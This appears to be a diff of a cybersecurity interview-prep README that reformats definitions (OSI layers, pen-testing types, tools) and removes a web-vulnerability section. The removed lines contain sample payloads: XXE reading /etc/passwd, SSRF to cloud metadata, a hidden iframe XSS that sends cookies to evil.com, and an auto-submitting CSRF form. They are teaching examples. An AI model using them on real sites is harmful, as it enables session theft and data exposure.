@@ -4,7 +4,14 @@ The content presented here does not belong to me in any way. It is a compilation
 **Note:**
 Based on my personal experience, the following list comprises some commonly encountered interview questions. However, I cannot guarantee that interview questions will be 100% derived from this repository.
 
+
+
+
+
+---
+# **Level 1:** 
 ### Awesome Interview Links: For (freshers)
+
 | S.N | Link                                                                                         | By    |
 |-----|----------------------------------------------------------------------------------------------|-------------|
 | 1   | [Cyber Security Interview Questions - Part 1](https://shifacyclewala.medium.com/cyber-security-interview-questions-part-1-ae00b96c5610) | [Shifa cyclewala](#) |
@@ -77,31 +84,31 @@ Based on my personal experience, the following list comprises some commonly enco
   >For example, a software or an application that has code vulnerable to a buffer or flow exploit.
   
   
-- ```Threats```
+- **```Threats```**
   
   >A threat is an event, natural or man-made, able to cause a negative impact on an organization.
 
 
-- ```Exploit```
+- **```Exploit```**
   
   
   >An exploit is a defined way to breach the security of an IT system through a vulnerability.
   
   
-- ```Risk```
+- **```Risk```**
     ```
     It is an situation involving exposure to dange.
     ```
 ### 4. Define **Indentification**, **Authentication**, and **Authorization**?
-- ```Indentification```
+- **```Indentification```**
   
   >Identification is the process in which the ability to identify uniquely a user of a system or an application that is running in the system.
   
-- ```Authentication```
+- **```Authentication```**
   
   >Process of verifying the identity of the user who claims to be.
   
-- ```Authorization?```
+- **```Authorization```**
   
   >What level of access someone have ,i.e process of granting access and defining the specific resources for a user's needs.
   
@@ -110,18 +117,18 @@ Based on my personal experience, the following list comprises some commonly enco
 
 >A three-way handshake is a method used in a TCP/IP network to create a connection between a local host/client and server.
 
-- ```Step 1 (SYN):```
+- **```Step 1 (SYN):```**
 
     
     >In the first step, the client wants to establish a connection with a server, so it sends a segment with SYN(Synchronize Sequence Number) which informs the server that the client is likely to start communication and with what sequence number it starts segments with
     
 
-- ```Step 2 (SYN + ACK):``` 
+- **```Step 2 (SYN + ACK):```**
     
     >The Server responds to the client request with SYN-ACK signal bits set. Acknowledgement(ACK) signifies the response of the segment it received and SYN signifies with what sequence number it is likely to start the segments with
     
 
-- ```Step 3 (ACK):```
+- **```Step 3 (ACK):```**
     
     >In the final part client acknowledges the response of the server and they both establish a reliable connection with which they will start the actual data transfer
     
@@ -141,11 +148,11 @@ Three versions of SSL have been released: SSL 1.0, 2.0, and 3.0. |	Four versions
 All versions of SSL have been found vulnerable, and they all have been deprecated. |	TLS 1.0 and 1.1 have been “broken” and are deprecated as of March 2020. TLS 1.2 is the most widely deployed protocol version.
 
 ### 7. Accounting V/S Auditing.
-- ```Accounting```
+- **```Accounting```**
     ```
     The Process of tracking and recording system activities and resource access.
     ```
--    ```Auditing```
+-    **```Auditing```**
         ```
      The portion of accounting requires security professionals to examine logs of what was recorded.
         ```
@@ -153,7 +160,7 @@ All versions of SSL have been found vulnerable, and they all have been deprecate
 
 ### 8. Give the name of few tools used in penetration testing.
 
-- ```BurpSuite```
+- **```BurpSuite```**
     
     Burp or Burp Suite is a set of tools used for penetration testing of web applications. It is developed by the company named Portswigger, 
     
@@ -187,7 +194,7 @@ All versions of SSL have been found vulnerable, and they all have been deprecate
         -----------------------------------------------
         >Decoder lists the common encoding methods like URL, HTML, Base64, Hex, etc.
         
-- ```Nessus```
+- **```Nessus```**
     
     >The Nessus vulnerability scanner is a remote security scanner from Tenable, Inc. 
     
@@ -195,7 +202,7 @@ All versions of SSL have been found vulnerable, and they all have been deprecate
     >Nessus scans a computer and then generates alerts if vulnerabilities are discovered.  Nessus runs over 1,000+ checks to see if vulnerabilities exist.
     
 
-- ```Nikto```
+- **```Nikto```**
     
     >Nikto is an Open Source software written in Perl language that is used to scan a web-server for the vulnerability that can be exploited and can compromise the server. 
     
@@ -205,7 +212,7 @@ All versions of SSL have been found vulnerable, and they all have been deprecate
     
     Example : **nikto -host www.example.com
     
-- ```Nmap```
+- **```Nmap```**
     
     >Nmap is a free and open-source network scanner tool. Nmap is used to discover hosts and services on a computer network by sending packets and analyzing the  responses.
     
@@ -238,32 +245,28 @@ All versions of SSL have been found vulnerable, and they all have been deprecate
       ```
       -oX output.xml
       ```
-   - **Disable DNS Name Resolution**
-      ```
-      nmap -sp -n 192.100.1.1/24
-       ```
        
-
 
 ### **9. Encription VS encoding Vs Hashing** 
 
 
-- ```Hashing:``` 
+- **```Hashing:```**
     
     >A string of numbers generated to confirm the integrity of data through hashing algorithms.
     
     
     >Hashing is a form of cryptographic security which differs from encryption. Whereas encryption is a two step process used to first encrypt and then decrypt a message, hashing condenses a message into an irreversible fixed-length value, or hash.
     
-- ```Encryption:```
+- **```Encryption:```**
     
     >A technique used to maintain the confidentiality of data by converting the data into an undecipherable format.
     
-- ```Encoding:```
+- **```Encoding:```**
     
      >A conversion of data from one format to another format.
      
   
+
  > ### Encription vs Hashing
 
  |```Encryption``` |	```Hashing``` |
@@ -273,6 +276,7 @@ It is reversible | It is irreversible
 Variable Length | 	Fixed Length  
 Types :	Asymmetric and Symmetric |	Hashing
 Common Algorithms :	AES, RC4, DES, RSA, ECDSA |	SHA-1, SHA-2, MD5, CRC32, WHIRLPOOL
+
 
  > ## Encription vs Encoding
  
@@ -306,39 +310,17 @@ Retransmission of lost packets is possible in TCP, but not in UDP. | There is no
 
 >He lower layer of the OSI model deals with the data transport issues. The data link layer and the physical layer are implemented in hardware and software. 
 
-- 1.**Application Layer:** HTTP, SMTP - [More on Ports](https://www.geeksforgeeks.org/protocols-application-layer/)
-    
-    >Application layer interface directly interacts with the application and provides common web application services
+| S.N | OSI Layer          | Function                                                                  | Protocols                                 |
+|-----|--------------------|---------------------------------------------------------------------------|-------------------------------------------|
+| 1   | Application Layer  | Application layer interface directly interacts with the application and provides common web application services                            | HTTP, FTP, SMTP, POP, SNMP, DHCP        |
+| 2   | Presentation Layer | Translate, encrypt, and compress data                                    | SSL, TLS, ASCII, JPEG, MPEG              |
+| 3   | Session Layer      | To establish, manage, and terminate sessions                             | NetBios, PPTP, RPC, SIP, SSH             |
+| 4   | Transport Layer    | Provide Reliable end to end communication solution <br>**-** Form **Semgments**  | TCP, UDP, SCTP, DCCP, SPX               |
+| 5   | Network Layer      | <br>**-** Move packet from source to destination <br> **-** Internetworking, Addressing  <br> - Form **Packets**                                            | IP, ICMP, ARP, OSPF, BGP, RIP            |
+| 6   | Data Link Layer    | - Framing, error detection and correction, acknowledgment, flow control, ensuring well-defined reliable service interface to the network layer, encapsulating packets from network layer to frames, etc <br> **-** Form **Frames** | Bridge, Switch, Ethernet, PPP, HDLC     |
+| 7   | Physical Layer     | **-** Controls the way unstructured, raw, bit-stream data is sent and received over a physical medium. <br> **-** Composed of the electrical, optical, and physical components of the network. <br> **-** Form **Bits** | Coax, Fiber, Wireless, RJ45, Bluetooth  |
 
-    >(Data),LPD, SNMP,DNS, Telnet, DHCP, FTP 
-    
-- **2.Presentation Layer : SSL, TLS (Data)**
-    ```
-    Translate, encript, and compress data
-    ```
-- **3.Session Layer : NetBios, PPTP (Data)**
-    ```
-    To establish, manage, and terminate session
-    ```
-- **4.Transport Layer : TCP, UDP (Segment)**
-    
-    >accept data from the session layer, split it up into smaller units if need be, pass these to the Network layer, Multiplexing  Demultiplexing, Flow control, Error Control
-    
-- **5.Network Layer : IP (Packet)**
-    
-    >Internetworking: This is the main duty of network layer
-    -----------------------------------------------
-    >Addressing: Addressing is necessary to identify each device on the internet uniquely
-    -----------------------------------------------
-    >Addressing: Addressing is necessary to identify each device on the internet uniquely
-    
-- **6.Data Link Layer : Bridge, Switch, Ethernet(Frames)**
-    
-    >framing, error detection and correction, acknowledgement, flow control, ensuring well-defined reliable service interface to the network layer, encapsulating packets from network layer to frames, etc
-    
-- **7.Physical Layer :Coax, Fiber, Wireless (Bit)**
-    
-    >This layer controls the way unstructured, raw, bit -stream data is sent and received over a physical medium. This layer is composed of the electrical, optical, and physical components of the network.
+
     
 
 ### 12. TCP/IP Model
@@ -377,19 +359,18 @@ Retransmission of lost packets is possible in TCP, but not in UDP. | There is no
 >The type of penetration testing normally depends on the scope and the organizational wants and requirements. This can classfied in to 3 types
 
 
-- ```Black Box Penetration Testing```
+- **Black Box Penetration Testing**
     
-    In black box penetration testing, tester has no idea about the systems that he is going to test. He is interested to gather information about the target network or system.
-    
-- ```White Box Penetration Testing```
-    
-    >It is normally considered as a simulation of an attack by an internal source. It is also known as structural, glass box, clear box, and open box testing.
+    ```In black box penetration testing, tester has no idea about the systems that he is going to test. He is interested to gather information about the target network or system.```<br><br>
 
-    >White box penetration testing examines the code coverage and does data flow testing, path testing, loop testing, etc.
-
-- ```Grey Box Penetration Testing```
+-  **White Box Penetration Testing**
     
-    >In this type of testing, a tester usually provides partial or limited information about the internal details of the program of a system.
+    ```It is normally considered as a simulation of an attack by an internal source. It is also known as structural, glass box, clear box, and open box testing.``` <br><br>
+
+    ```White box penetration testing examines the code coverage and does data flow testing, path testing, loop testing, etc```. <br><br>
+
+- **Grey Box Penetration Testing**
+   ```In this type of testing, a tester usually provides partial or limited information about the internal details of the program of a system.```
     
 
 ### 15. What is ports and  most common network ports and services.
@@ -711,567 +692,3 @@ messages to inform that future
 
 	>An attacker can potentially use CGI to send a malformed environment variable to a vulnerable Web server. Because the server uses Bash to interpret the variable, it will also run any malicious command tacked-on to it.
     
-
-- >`Content Security Policy (CSP)`
-    
-    >is an added layer of security that helps to detect and mitigate certain types of attacks, including 	
-    
-    >Cross Site Scripting (XSS) and data injection attacks. 
-
-		Ex-1
-		A web site administrator wants all content to come from the site's own origin
-		(this excludes subdomains.)
-
-		Content-Security-Policy: default-src 'self'
-
-		Ex-2 
-		A web site administrator wants to allow content from a trusted domain and all its subdomains
-		(it doesn't have to be the same domain that the CSP is set on.)
-
-		Content-Security-Policy: default-src 'self' *.trusted.com
-    
-- >`HSTS`
-
-    a. HTTP Strict Transport Security (HSTS) is an opt-in security enhancement that is specified by a web application through the use of a special response header.
-    
-        Once a supported browser receives this header that browser will prevent any communications from being sent over HTTP to the specified domain and will instead send all communications over HTTPS.
-
-	b. HSTS does not allow a user to override the invalid certificate message
-
-- >`WebDav`
-    
-    a. Web Distributed Authoring and Versioning (WebDAV) is an extension of the Hypertext Transfer Protocol 		(HTTP) that allows clients to perform remote Web content authoring operations.
-
-		b. The WebDAV protocol provides a framework for users to create, change and move documents on a server.
-
-		COPY
-   			 copy a resource from one URI to another
-		MOVE
-  		  move a resource from one URI to another
-    
-- >`What is API?`
-    
-	>An application program interface (API) is a set of routines, protocols, and tools for building software applications. Basically,an API specifies how software components should interact. Additionally, 
-    
-    >APIs are used when programming graphical user interface (GUI) components.
-    - Web service APIs
-	>Apart from the main web APIs, there are also web service APIs:
-		+SOAP
-		+XML-RPC
-		+JSON-RPC
-		+REST
-		
-	>A web service is a system or software that uses an address, i.e., URL on the World Wide Web, to provide access to its services.
-
-	## **The following are the most common types of web service APIs:**
-
-    - >`SOAP (Simple Object Access Protocol):`
-        
-        >This is a protocol that uses XML as a format to transfer data. Its main function is to define the structure of the 			messages and method of communication. It also uses WSDL, or Web Services Definition Language, in a machine-readable document to publish a definition of its interface.
-        
-
-	- >`XML-RPC:`
-        
-		>This is a protocol that uses a specific XML format to transfer data compared to SOAP that uses a proprietary XML format. 		 It is also older than SOAP.
-        
-        >XML-RPC uses minimum bandwidth and is much simpler than SOAP. Example
-		><employees>
-  		><employee>
-   		><firstName>Becky</firstName> <lastName>Smith</>lastName>
-        
-
-	- >`SON-RPC:`
-        
-        >This protocol is similar to XML-RPC but instead of using XML format to transfer data it uses JSON. Example
-		>{"employees":[
-		>{"firstName":"Becky", "lastName":"Smith" },
-        ```
- 
-	- >`REST (Representational State Transfer):`
-        
-		>REST is not a protocol like the other web services, instead, it is a set of architectural principles. 
-        
-        >The REST service needs to have certain characteristics, including simple interfaces, which are resources identified easily within the request and manipulation of resources using the interface.
-        
-- >`DOM Based XSS`
-    
-    >DOM Based XSS simply means a Cross-site scripting vulnerability that appears in the DOM (Document Object Model) instead of part of the HTML.
-    
-    
-    - Occurs entirely on the client side or on the code located in the browser
-	- Payload is never sent to the server
-	- document.url, document.location, document.referrer, location.href, location.search, document.write
-	objects are most popular
-    
-	
-    > **Mitigation**
-	
-		- HTML encoding and javascript encoding all untrusted input.
-		- Avoid client side sensitive actions 
-		- You can use the JavaScript built-in functions encode() or encodeURI() to escape data coming from
-		  the client's end.
-
-- >`DOM`
-    
-    >Dom is a tree of objects created by the browser when the webpage is loaded and allows client-side-scripts(Eg: Javascript) to dynamically access and modify the content, structure, and style of a webpage. 
-    
-
-- >`What can be done with XSS`
-    
-    - Cookie stealing leading to session hijacking
-    - CSRF token stealing and conducting CSRF attacks
-    - Phishing Attacks
-    
-- >`CORS`
-    
-    - The Cross-Origin Resource Sharing standard works by adding new HTTP headers that allow servers
-
-    - to describe the set of origins that are permitted to read that information using a web browser.
-		  
-    - CORS defines the protocol to use between a web browser and a server to determine whether 
-    
-- >`a cross-origin`
-    
-    >request is allowed. In order to accomplish this goal, there are a few HTTP headers involved in this
-    
-    
-		  process, that are supported by all major browsers and we will cover below including: Origin,
-		    Access-Control-Request-Method,
-            Access-Control-Request-Headers,
-            Access-Control-Allow-Origin,
-		    Access-Control-Allow-Credentials
-            Access-Control-Allow-Methods, 
-            Access-Control-Allow-Headers.
-    
-    
-    >A CORS request must have an Origin header; there is no way around it. If there is no Origin header,
-		    it is not CORS. This Origin header is added by the browser, and can not be controlled by the user.
-    
-		    
-	
-    >Pre-flight request: Let’s say that your web server does not support CORS, but browsers have implemented CORS. 
-		   This means that your web server will get CORS requests that it does not know how to respond to.
-
-		To avoid the element of surprise, the browser sends preflight request and ask servers if they support
-		CORS and allow requests with that origin, containing methods and headers. If not, the browser will not
-		make the actual request.
-		
-		GET, POST, HEAD and OPTIONS are all requests that server understands, so no preflight request
-		are initiated from browser.
-    
-
-- >`Same origin policy`
-
-	>Under the policy, a web browser permits scripts contained in a first web page to access data
-
-	>in a second web page, but only if both web pages have the same origin. An origin is defined 
-
-	>as a combination of URI scheme, hostname, and port number.
-
-- >`XXE Attack (XML External Entity Attack)`
-
-    >ts an attack against an application that parses XML input. This attack occurs when 
-
-
-    >an XML input containing reference to an external entity is processed by a weakly
-
-
-- >**configured parser.**
-    
-    >XML is a kind of format that is used to describe data.
-
-    - Two systems which are running on different technologies can communicate and exchange data with one another using XML.
-  
-    - XML documents can contain something called          ‘entities’ defined using a system identifier and are present within a DOCTYPE header. These entities can access local or remote content. 
-  
-    - 1. An attacker forces the XML parser to access the resource specified by him which could be a file on 
-    the system or on any remote system.
-
-        <?xml version="1.0" encoding="ISO-8859-1"?>
- 	 	 <!DOCTYPE foo [  
-  	 	 <!ELEMENT foo ANY >
-  	  	 <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
-	     
-		googledork -> allinurl:skin/frontend
-	     
-			<!DOCTYPE a
-			 [<!ENTITY baba "hacked !!!">]
-			 >
-	     
-		 <methodCall><methodName>&baba;</methodName></methodCall>
-	 
-
-		Remediation: The best solution would be to configure the XML processor to use a local
-		static DTD and 	disallow any declared DTD included in the XML document as input.
-
-        http://resources.infosecinstitute.com/xxe-attacks/#gref
-
-    
-- >`SQL`
-    
-    >SQLi occurs when an application accepts malicious user input that can be used to query the backend database.
-
-        https://www.synopsys.com/software-integrity/resources/knowledge-database/sql-injection.html
-        
-- **Mitigation:** 
-`
-    1. Use of prepared statements with parametrized queries. 
-
-			Prepared statements force developers 
-			a. to use static SQL query and then (SQL statements are executed first)
-			b. pass in the external input as a parameter to query.
-
-			This approach ensures the SQL interpreter always differentiates between code and data.
-	
-		2. Input validation
-		3. Stored Procedures
-			SQL statements defined and stored in the database itself and then called from the application. 
-			Developers are usually only required to build SQL statements with parameters that are 
-			automatically parameterized. 
-		4. WAF
-   `
- - >`Blind SQL Injection:`
-    
-    >This attack is often used when the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection. Blind SQL (Structured Query Language) injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the applications response.
-    
-
-    
-    >For ex: http://newspaper.com/items.php?id=2 and 1=1 If the content of the page that returns 'true' is different than that of the page that returns 'false', then the attacker is able to distinguish when the executed query returns true or false. 
-
-    https://www.youtube.com/watch?v=sJdWuPHKRRY
-    
-				
-         
-
-- > `Second Order SQLi`
-
-	1. Payload is inserted in one page and there isn't an instant response of the injected query.
-	2. This payload can be made to call on some other page that thus gets executed.
-	3. Similar to stored XSS.
-    
-    >**`Mitigation:`**
-    
-    All data being retrieved from the database must be escaped or encoded before using it.
-    
- 
-
-
-> `SSRF - Server Side Request Forgery`
-
->In a server-side request forgery (SSRF) attack, the attacker forces a vulnerable server to issue malicious requests on their behalf.
-    
->Server-Side Request Forgery (SSRF) occurs when a web application is making a request, where an attacker has full or partial control of the request that is being sent.
-    
->SSRF is usually used to target internal systems behind firewalls that are normally inaccessible to an attacker from the external network.
-    
->Server-Side Request Forgery (SSRF) can be used to make requests to other internal resources which the web server has access to, but are not publicly facing.
-	
-    >Ex- 
-
-			1. GET /?url=file:///etc/passwd HTTP/1.1
-			2. Port Scanning
-			3. Accessing instance metadata in Amazon EC2 and OpenStack instances. This service is only 
-			   available to the server and not to the outside world.
-			
-			GET /?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
-			Host: example.com
-
-
-
-
-> **`Contents of Digital Certificate (there are 2 sections)**`**
-
--	**Data Section**
-    
-    >Serial Number of the Certificate. Every certificate issued by a certificate authority (CA) has a serial number that is unique among the certificates issued by that CA.
-    
-- 
-  >Information about your public key, including the algorithm used and a representation of the key itself.
-  
--   
-    >The distinguished name (DN) of the CA that issued the certificate.
-
-    >The time during which the certificate is valid. For example, between 2:00 p.m. on March 26, 2000 and 2:00 p.m. on March 28, 2001.
-    
-	- `Signature Section`
-    
-    >The cipher or cryptographic algorithm that is used by issuing the CA to create its own digital signature
-
-    >The digital signature for the CA, which is obtained by hashing all of the information in the certificate together and encrypting it with the CA private key.
-
-
-- >`Template Injection`
-    
-    >To separate business logic (the logic that receives and processes data) and data representations (the logic that shows the data to the user), in modern web applications templates are often used.
-
-    >Template engines are widely used by web applications to present dynamic data via web pages and emails.
-
-    >Template Injection occurs when user input is embedded in a template in an unsafe manner.
-
-    >However in the initial observation, this vulnerability is easy to mistake for XSS attacks. But SSTI attacks can be used to directly attack web servers’ internals and leverage the attack more complex such as running remote code execution and complete server compromise  
-       
-**Server's Identity Verification**
-
-> 1- Client initiates a connection to the server and server responds with the SSH protocol version it supports. At this point client will continue if it supports the ssh version indicated by the server otherwise the communication breaks.
-
->2- If the client is good to go with the SSH version indicated by the server, both server and client switch to *Binary Packet Protocol*
-
->3- Server will now send some sensitive information to the client
-
-	> RSA public key of the server which is created during the openssh server installation
-
-	If the client is communication with the server for the first time, client will get a warning on his screen.
-
-	[root@slashroot1 ~]# ssh 192.168.0.105
-	The authenticity of host '192.168.0.105 (192.168.0.105)' can't be established.
-
-	RSA key fingerprint is 
-    c7:14:f4:85:5f:52:cb:f9:53:56:9d:b3:0c:1e:a3:1f.
-	Are you sure you want to continue connecting (yes/no)?
-
-	This is a host identity and not a user identity. Once the client hits yes, this gets saved in the *known_hosts* file
-
-		> Server key. This key is regenerated after every hour and its default size is 768bits. (/etc/ssh/sshd_config)
-
-		> 8 random bytes also called checkbytes. Its necessary to send these bytes by the client to the server
-		  in its next reply.
-
-		> All supports encryption methods and authentication methods.
-
-
-	4 - According to the list of encryption algorithms supported by the server, the client simply creates a 
-	random symmetric key and sends that symmetric key to the server. This symmetric key will be used to encrypt
-	as well as decrypt the whole communication during this session. This symmetric key is doubly encrypted using
-	server host key/ RSA public key first and then encrypted using server key.
-
-	The doubly encrypted symmetric key is sent along with the selected algorithm by the client. 
-	The algorithm is selected from the options 
-	provided by the server in the step 3.
-
-	5- After sending the session key(which is double encrypted with server key and server host key), the client
-
-	waits for a confirmation message from the server. The confirmation from the server must be encrypted with
-	the symmetric session key, which the client sent.
-
-	Once the client receives a confirmation from the server, both of them can now start the communication with this symmetric 			encryption key.
-
-
-- >` Client's Identity Verification**`
-
-     Various types are there -- Most popular are password based and Public Key Authentication
-
-	>1- The remote server on getting the passwords, logs in the user, based on the server's native
-	    password authentication mechanism.
-	The password transmitted by the client to the server is encrypted through the session symmetric key
-	(which only the server and the client knows)
-
-	>2- Public Key Authentication
-		> the client first needs to create an RSA public and private key(id_rsa, id_rsa.pub). Which can be done by a command called ssh-keygen.
-
-	> This public key will be given to all those server's where your require authentication. So a client that needs log-in to multiple servers using public key, needs to distribute his key to those multiple servers first.
-	> Sharing means the content of the file id_rsa.pub, must be there in the file authorized_keys on the server.
-
-	> From the list of authentication method's supported by the server, the client will selecta public key authentication and will also send the the details about the cryptography used for this public key authentication.
-    
-    > The server on receiving the public key authentication request, will first generate a random 256 bit string as a challenge for the client, and encrypt it with the client public key, which is inside the authorized_keys file. 
-		
-    > The client on receiving the challenge, will decrypt it with the private key(id_rsa). 
-		> The client will now combine that string with the session key(which was previously negotiated 
-		and is being used for symmetric encryption.) And will generate a md5 hash value. This hash value is
-		send to the server.
-		> The server on receiving the hash, will regenerate it(because the server also has both the random string
-		as well as the session key), and if it matches the hash send by the client, the client authentication succeeds.
-
-
-- **`Digital Signature`**
-
-		1. Message sent by the user was not tampered in transit.
-		2. Message has been sent by the legitimate user.
-		
-    > ***`Process`***
-
-	**Sender**
-    
-		- Take the email and generate a one way hash using MD5 or SHA1
-		- Take the one way hash and create a Signature using the owner's private key (This proves that the sender has a private key)
-
-			(Hash is encrypted using private key) = signature
-
-		- Send the message along with the signature = Digitally signed data
-
-	Signature is an method/algorithm that takes in hash(message digest) and private key to produce a signature.
-    
-
-	**Receiver**
-
-		- On receiving, receiver wants to ensure that its untampered. So generate the message hash with 
-		   the same algorithm SHA1
-		- The encrypted hash or the signature is decrypted using sender's public key and the hash is obtained.
-		- Hash from step1 and Step2 is compared to confirm if the message is untampered.
-
-
-- >**`Iframe Injection`**
-    
-    >An example would consist of an attacker convincing the user to navigate to a web page the attacker controls. The attacker's page then loads malicious JavaScript and an HTML iframe pointing to a legitimate site. Once the user enters credentials into the legitimate site within the iframe, the malicious JavaScript steals the keystrokes. Ex: This can be used to exploit a known bug in IE browsers. 
-
-
-- > **`XSS using Iframe Injection`**
->
-	1. Attackers hosts a page evil.com
-
-	2. A website example.com has a XSS vulnerable parameter q.
-
-	3.The user is tricked to visit evil.com that contains an iframe, which makes request to 
-	the flawed example.com
-   
-	<iframe style="position:absolute;top:-9999px" src="http://example.com/↵
-    flawed-page.html?q=<script>document.write('<img src=\"http://evil.com/↵
-    ?c='+encodeURIComponent(document.cookie)+'\">')</script>"></iframe>
-
-	4.When the evil.com page is visited by the victim, the browser makes a request to example.com silently using iframe. The request contains the xss vulnerable parameter and the payload is injected along.
-
-	5.The payload says to make a request to evil.com along with the cookie of the example.com website.
-
-     
-
-- >`CSRF using iframe injection`
-
-    
-   > Here the user doesn't knows that example.com was visited.
-    
-
-- >`X-Frame-Options`
-    
-   >This Headers tells the browser not to allow loading of the webpage in an iframe, frame or object.
-   
-- >`Clickjacking`
-    
-    >It is an attack that occurs when an attacker uses a transparent iframe in a window to trick a user into
-    
-    >clicking on a button or link, to another server in which they have an identical looking window.
-
-	>Example: For example, imagine an attacker who builds a web site that has a button on it that says
-
-	>"click here for
-	a free iPod". However, on top of that web page, the attacker has loaded an iframe with your mail account, and
-
-
-	>lined up exactly the "delete all messages" button directly on top of the "free iPod" button. The victim tries
-
-	>to click on the "free iPod" button but instead actually clicked on the "delete all messages" button. In essence,
-	the attacker has "hijacked" the user's click, hence the name "Clickjacking"
-    
-
-- > `XPATH injection`
-    
-	- 1. Xpath is a language used to query certain parts of a XML document. It can be compared to
-		the SQL language used to query databases.
-
-		2. XPath Injection attacks occur when a web site uses user-supplied information to construct
-		an XPath query for XML data.
-
-		3. By sending intentionally malformed information into the web site, an attacker can find out how the
-		XML data is structured, or access data that he may not normally have access to.
-
-    
-    **Mitigation:**
-
-		> Use a parameterized XPath interface if one is available, or escape the user input to make
-
-		it safe to include in a dynamically constructed query.
-
-		 >Input containing any XPath metacharacters such as " ' / @ = * [ ] ( and ) should be rejected.
-
-- >**`Session Fixation`**
-  
-  - >attack is an attack technique that forces a user's session ID to an explicit value that permits an attacker to hijack a valid user session
-
-    >The example below explains a simple form, the process of the attack, and the expected results.
-
-    >(1) The attacker has to establish a legitimate connection with the web server which 
-    (2) issues a session ID or, the attacker can create a new session with the proposed session ID, then, 
-    (3) the attacker has to send a link with the established session ID to the victim, she has to click on the link sent from the attacker accessing the site, 
-    (4) the Web Server saw that session was already established and a new one need not to be created, 
-    (5) the victim provides his credentials to the Web Server, 
-    (6) knowing the session ID, the attacker can access the user's account.
-
-	> Meta tag attack : Using this we can set a cookie value on the server.
-			http://website.kon/<meta http-equiv=Set-Cookie content=”sessionid=abcd”>
-
-	> A Cross-site Scripting vulnerability present on any web site in the domain can be used  to modify the current cookie value.
-			http://example/<script>document.cookie="sessionid=1234;%20domain=.example.dom";</script>
-
-	> HTTP header response
-			The insertion of the value of the SessionID into the cookie manipulating the server response 				
-            can be made, intercepting the packages exchanged between the client and the
-			Web Application inserting the Set-Cookie parameter.
-
-        https://www.owasp.org/index.php/Session_fixation
-
-- > `CRLF Injection / HTTP Response Splitting`
-    
-    >is a web application vulnerability happens due to direct passing of user entered data to the response header fields like (Location, Set-Cookie and etc) without proper sanitsation, which can result in various forms of security exploits. Security exploits range from XSS, Cache-Poisoning, Cache-based defacement, page injection and etc.
-    
-    >CR (Carriage Return) and LF (Line Feed) are non-printable characters which together indicate end-of-line.
-
-    lf-injection-http-response-splitting-explained/
-    
-- `JSON` 
-
->JSON is JavaScript Object Notation: Its a text based data exchange protocol used by the applications. Human readable and data can be arranged in hierarchial way.
-
->Heavily used in AJAX instead of XML due to its light weight.
-
-
-- `CSRF`
-
->CSRF is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated.
-
->Malicious website exploits the trust between the victim's browser and the vulnerable website to which victim is authenticated to.
-
->CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request.
-
- 	1. Can happen if website is vulnerable to html injection or xss.
-	1. Malicious website hosting the vulnerable Form or GET request.
-	2. img src, script src, iframe src tags can be used.
-    -----------------------
-    Ex- CSRF using iframe--
-    -----------------------			
-			<iframe name="attack" style=display:none></iframe>
-			<form action="bawhaha" method="POST" target="attack">
-			<script>document.forms[0].submit();</script>
-
-		1. Create a POST request form containing CSRF submit request
-		2. Create an iframe
-		3. POST request is made as soon as the victim visits the page.
-		4. The response is loaded in the invisible iframe by putting a "target" paramter within
-			the Form attribute.
-	
-
-
-> `Ex- Breaking CSRF token cipher/hashing`
-
-   - **CSRF Mitigation**
-    
-    >SameSite attribute used with Set-Cookie header prevents the browser from sending this cookie
-    
-    >along with cross-site requests. The main goal is mitigate the risk of cross-origin information leakage.
-	
-    Set-Cookie: key=value; HttpOnly; SameSite=strict
-
-    
-> `IDOR : Authorization Problem`
-
-    
-    When a developer fails to apply authorization checks while various objects are being referenced.Happens in a multiuser system where a user is able to access another user's objects which he/she shouldn't be allowed to.
-
-
-> `Template Injection`
-
->To separate business logic (the logic that receives and processes data) and data representations (the logic that shows the data to the user), 	in modern web applications templates are often used.
-
->Template engines are widely used by web applications to present dynamic data via web pages and emails.
-
->Template Injection occurs when user input is embedded in a template in an unsafe manner.
-
->However in the initial observation, this vulnerability is easy to mistake for XSS attacks. But SSTI attacks can be used to directly attack web servers’ internals and leverage the attack more complex such as running remote code execution and complete server compromise.
